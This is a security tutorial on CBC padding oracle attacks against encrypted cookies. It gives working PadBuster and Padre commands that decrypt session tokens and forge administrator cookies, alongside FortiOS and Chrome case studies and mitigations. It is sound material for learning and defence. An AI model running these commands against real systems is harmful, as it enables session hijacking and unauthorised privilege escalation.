# Cookie Padding

## Overview

A padding oracle attack is a cryptographic vulnerability that exploits error messages returned by a server when decrypting ciphertext with incorrect padding. This attack targets CBC (Cipher Block Chaining) mode encryption and can allow an attacker to decrypt sensitive data or forge valid encrypted tokens without knowing the encryption key.

## How Padding Oracle Attacks Work

The attack leverages the fact that encrypted data in CBC mode is divided into blocks, and padding is added to fill incomplete blocks. When a server receives malformed ciphertext, its error responses reveal whether the padding was valid. This behavior becomes an "oracle" that attackers can query repeatedly to decrypt the entire message.

Real-world vulnerabilities have been documented in major software. In 2023, Fortinet's FortiOS was found to have a padding oracle vulnerability in its administrative session cookie encryption (CVE-2021-43074), allowing remote attackers to decrypt portions of session management cookies and escalate privileges . More recently, researchers discovered a padding oracle attack against Google Chrome's AppBound Cookie Encryption, dubbed the "C4 Bomb" attack, which exploits Windows DPAPI error reporting to bypass Chrome's dual-layer encryption protection .

## Identifying Padding Oracle Vulnerabilities

To identify if a target is vulnerable, you can modify encrypted tokens and observe server behavior:

```bash
curl -I "https://target.com/api/auth?token=ENCRYPTED_DATA"
```

Steps to identify:
- Intercept a request containing an encrypted token (session cookie, API key, or other parameter)
- Modify the last byte of the token and observe server responses
- If the server returns "Invalid padding" error or exhibits consistent timing differences, a padding oracle likely exists

Common error indicators:
- "Invalid padding"
- "Padding error"
- "Decryption failed"
- HTTP 500 responses triggered by padding issues
- Different response times between valid and invalid padding

## Exploitation with PadBuster

PadBuster is a Perl-based tool specifically designed for exploiting padding oracle vulnerabilities . It automates the process of decrypting and encrypting arbitrary data through the padding oracle.

### Basic Usage Syntax

```bash
# https://github.com/AonCyberLabs/PadBuster
# Get cookie structure
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"

# Get cookie for other user (impersonation)
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorhc0nwithyhackme'
```

### Parameter Explanation

- **Target URL**: The endpoint that processes the encrypted token
- **Encrypted token**: The ciphertext to attack (Base64 or hex encoded)
- **Block size**: Typically 8 for DES/3DES or 16 for AES (AES uses 16-byte blocks)
- **-cookies**: Specifies the cookie name and value containing the encrypted token
- **-error**: The error message string that identifies padding failures
- **-plaintext**: Desired plaintext to encrypt (for token forgery)

### Real-World Exploitation Example

Consider a web application using encrypted cookies to store user session data:

```bash
# Step 1: Decrypt the existing cookie to understand its structure
padbuster http://example.com/dashboard.php "sF4jK2lM9nQwErTy" 16 -cookies "session=sF4jK2lM9nQwErTy" -error "Invalid padding"

# Step 2: Forge a cookie with elevated privileges
padbuster http://example.com/dashboard.php "sF4jK2lM9nQwErTy" 16 -cookies "session=sF4jK2lM9nQwErTy" -error "Invalid padding" -plaintext 'user=admin&role=administrator'
```

## Exploitation with Padre

Padre is a modern, concurrent implementation of padding oracle exploitation written in Go. It offers faster execution and automatic fingerprinting capabilities .

### Features
- Blazing fast concurrent implementation
- Automatic fingerprinting of padding oracles
- Automatic detection of cipher block length
- Support for tokens in GET/POST parameters and cookies
- Flexible encoding rules (Base64, hex, etc.)
- Informative hints when operations fail

### Basic Usage

```bash
# https://github.com/glebarez/padre
padre -u 'https://target.site/profile.php' -cookie 'SESS=$' 'Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg=='
```

### Decrypt and Encrypt Workflow

Padre automatically fingerprints HTTP responses to confirm padding oracle vulnerabilities. Once confirmed, it can decrypt the provided token:

```bash
# Decrypt existing token
padre -u 'https://target.site/profile.php' -cookie 'SESS=$' 'encrypted_token_here'
```

Typical decrypted output might reveal sensitive data:
```json
{"user_id": 456, "is_admin": false}
```

### Encrypting Arbitrary Data

After understanding the plaintext structure, you can generate encrypted tokens with modified content:

```bash
# Generate encrypted token with elevated privileges
padre -u 'https://target.site/profile.php' -cookie 'SESS=$' -enc '{"user_id": 456, "is_admin": true}'
```

The tool outputs new encoded ciphertext that can be used in the browser to escalate privileges .

## Advanced Tool: RustPad

RustPad is another implementation of padding oracle exploitation written in Rust, offering memory safety and performance benefits.

```bash
# https://github.com/Kibouo/rustpad
```

## Real-World Attack Scenarios

### Case Study 1: FortiOS Administrative Session Cookie (CVE-2021-43074)

In 2023, a padding oracle vulnerability was discovered in Fortinet's FortiOS cookie encryption mechanism. The vulnerability existed due to improper verification of cryptographic signatures when handling cookie files. A remote attacker could decrypt portions of the administrative session management cookie and escalate privileges on the device. Fortinet released patches, but the vulnerability highlighted how padding oracles can compromise network security appliances .

### Case Study 2: Google Chrome AppBound Cookie Encryption Bypass

In 2025, researchers developed the "C4 Bomb" (Chrome Cookie Cipher Cracker) attack against Google Chrome version 127 and later. Chrome implemented AppBound Cookie Encryption using dual-layer DPAPI encryption (user-level then SYSTEM-level). However, researchers discovered a padding oracle vulnerability in how Windows DPAPI handles padding and error reporting. By sending modified ciphertexts to Chrome's elevation service and observing Windows Event Logs as an oracle, attackers with only low-privileged access could reconstruct the SYSTEM-encrypted key and decrypt all stored cookies. This bypass affected Chrome's protection against infostealer malware families including Lumma, Meduza, Vidar, and WhiteSnake .

## Mitigation Strategies

To protect against padding oracle attacks:

1. **Use authenticated encryption**: Implement AEAD ciphers like AES-GCM or ChaCha20-Poly1305 instead of CBC mode
2. **Consistent error messages**: Return identical error responses for all decryption failures
3. **Implement HMAC**: Use "Encrypt then MAC" pattern to validate ciphertext integrity before decryption
4. **Disable detailed error messages**: Never expose padding errors to clients in production
5. **Update vulnerable software**: Apply security patches for known padding oracle vulnerabilities immediately

## References

- PadBuster GitHub: https://github.com/AonCyberLabs/PadBuster
- Padre GitHub: https://github.com/glebarez/padre
- RustPad GitHub: https://github.com/Kibouo/rustpad
